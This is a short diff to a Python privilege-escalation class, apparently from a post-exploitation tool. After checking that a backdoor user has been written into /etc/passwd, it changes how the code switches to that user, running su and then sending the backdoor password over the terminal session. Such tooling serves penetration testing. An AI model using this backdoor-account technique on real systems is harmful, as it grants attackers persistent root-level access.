@@ -119,7 +119,9 @@ class Finder:
             if self.backdoor_user_name not in self.pty.users:
                 raise PrivescError("/etc/passwd update failed!")
 
-        self.pty.run(f"su {self.backdoor_user_name}", input=self.backdoor_password)
+        self.pty.process(f"su {self.backdoor_user_name}", delim=False)
+        self.pty.client.send(self.backdoor_password.encode("utf-8") + b"\n")
+        self.pty.run("echo")
 
     def write_file(
         self,
